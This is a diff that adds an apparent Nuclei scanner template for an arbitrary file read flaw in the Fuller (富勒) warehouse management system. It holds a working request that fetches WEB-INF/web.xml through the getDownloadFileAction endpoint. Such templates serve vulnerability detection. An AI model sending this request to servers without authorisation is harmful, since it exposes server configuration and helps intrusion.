@@ -1,0 +1,27 @@
+id: fulecangchu-getDownloadFileAction-File-reading
+
+info:
+  name: 富勒仓储管理系统 getDownloadFileAction 任意文件读取漏洞
+  author: fulecangchu
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /a00webres/getDownloadFileAction?dowmLoadUrl=WEB-INF/web.xml&fileName=web.xml HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version='
+          - '<web-app'
+          - '</web-app>'
+          - '<servlet>'
+          - '</servlet>'
+        condition: and
+      - type: status
+        status: 
+          - 200
